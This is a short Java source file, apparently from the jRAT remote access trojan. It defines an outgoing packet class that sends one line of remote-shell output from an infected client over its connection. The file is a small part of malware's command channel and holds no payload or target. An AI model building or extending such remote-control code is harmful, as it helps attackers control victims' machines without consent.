package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet21RemoteShell implements OutgoingPacket {

	private String line;

	public Packet21RemoteShell(String line) {
		this.line = line;
	}

	@Override
	public void write(Connection con) throws Exception {
		con.writeLine(this.line);
	}

	@Override
	public short getPacketId() {
		return 21;
	}

}
